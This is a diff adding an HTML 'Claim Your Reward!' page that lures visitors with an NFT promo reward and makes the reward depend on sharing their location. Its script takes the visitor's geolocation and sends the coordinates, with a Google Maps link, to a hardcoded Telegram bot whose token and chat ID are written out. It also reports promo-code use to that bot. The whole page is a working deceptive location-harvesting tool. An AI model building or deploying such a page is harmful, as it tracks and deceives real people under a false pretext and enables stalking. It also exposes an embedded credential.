@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Reward!</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #FF5C8D, #FFD700);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #fff;
+            overflow: hidden;
+        }
+
+        .container {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 15px 25px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 450px;
+            width: 90%;
+            animation: popUp 1s ease-in-out;
+        }
+
+        h1 {
+            font-size: 36px;
+            margin-bottom: 20px;
+            color: #FF6F61;
+            text-shadow: 3px 3px 5px rgba(0, 0, 0, 0.5);
+            animation: bounceIn 1s ease;
+        }
+
+        p {
+            font-size: 18px;
+            color: #f5f5f5;
+            margin-bottom: 20px;
+            animation: fadeIn 1.5s ease;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 14px;
+            font-size: 18px;
+            margin-bottom: 20px;
+            border: none;
+            border-radius: 10px;
+            background: #FF9F80;
+            color: #fff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s;
+        }
+
+        input[type="text"]:focus {
+            transform: scale(1.05);
+            outline: none;
+        }
+
+        button {
+            background: linear-gradient(135deg, #6a5acd, #483d8b);
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            font-size: 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: transform 0.3s;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.4);
+        }
+
+        button:hover {
+            transform: scale(1.1);
+        }
+
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            visibility: hidden;
+            opacity: 0;
+            transition: opacity 0.5s, visibility 0.5s;
+        }
+
+        .popup.active {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        .popup-content {
+            background: #1e1e2f;
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        .popup-content h2 {
+            margin-bottom: 15px;
+            color: #FF6F61;
+            font-size: 28px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+
+        .popup-content p {
+            color: #ddd;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .popup-content a {
+            color: #FFD700;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .close-popup {
+            margin-top: 20px;
+            background: #FF6F61;
+            color: white;
+            border: none;
+            padding: 14px 22px;
+            font-size: 18px;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+
+        @keyframes popUp {
+            from {
+                opacity: 0;
+                transform: translateY(-50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes bounceIn {
+            0% {
+                transform: scale(0);
+                opacity: 0;
+            }
+            50% {
+                transform: scale(1.2);
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateY(-20px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 Claim Your Awesome Reward! 🎉</h1>
+        <p>Enter the exclusive promo code and unlock your surprise, without sharing the location no reward will be provided</p>
+        <input type="text" id="promoCode" placeholder="Enter promo code">
+        <button onclick="submitPromoCode()">Claim Now!</button>
+        <button onclick="getLocation()">Share Location</button>
+    </div>
+
+    <div class="popup" id="popup">
+        <div class="popup-content">
+            <h2>🎉 Congrats! 🎉</h2>
+            <p>Your promo code was successfully accepted. To claim your reward, please send a screenshot of your NFT to:</p>
+            <p><a href="https://x.com/nftfanstoken" target="_blank">https://x.com/nftfanstoken</a></p>
+            <button class="close-popup" onclick="closePopup()">Close</button>
+        </div>
+    </div>
+
+    <script>
+        // Replace with your Telegram Bot Token and Chat ID
+        const botToken = '6857744542:AAGyG0yV6a5ru5Au4UN8th0230dyGhEXhCc';
+        const chatId = '2141064153';
+
+        function sendNotification(message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Notification sent successfully.');
+                    } else {
+                        console.error('Failed to send notification:', data);
+                    }
+                })
+                .catch(error => console.error('Error:', error));
+        }
+
+        function submitPromoCode() {
+            const promoCode = document.getElementById('promoCode').value;
+            const validPromoCodes = ["NFTFAN2025", "NFTFAN1025", "NFTFAN3025"];
+
+            if (validPromoCodes.includes(promoCode)) {
+                sendNotification(`A customer used the promo code: ${promoCode}`);
+                document.getElementById('popup').classList.add('active');
+            } else {
+                alert('Oops! Invalid promo code. Try again!');
+            }
+        }
+
+        function closePopup() {
+            document.getElementById('popup').classList.remove('active');
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function sendLocationToTelegram(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const message = `A user opened the page at latitude: ${latitude}, longitude: ${longitude}. You can view it on Google Maps: https://www.google.com/maps?q=${latitude},${longitude}`;
+            sendNotification(message);
+        }
+
+        function showError(error) {
+            let message = '';
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    message = "User denied the request for Geolocation.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    message = "Location information is unavailable.";
+                    break;
+                case error.TIMEOUT:
+                    message = "The request to get user location timed out.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    message = "An unknown error occurred.";
+                    break;
+            }
+            alert(message);
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // Your page loading actions (if needed)
+        });
+    </script>
+</body>
+</html>
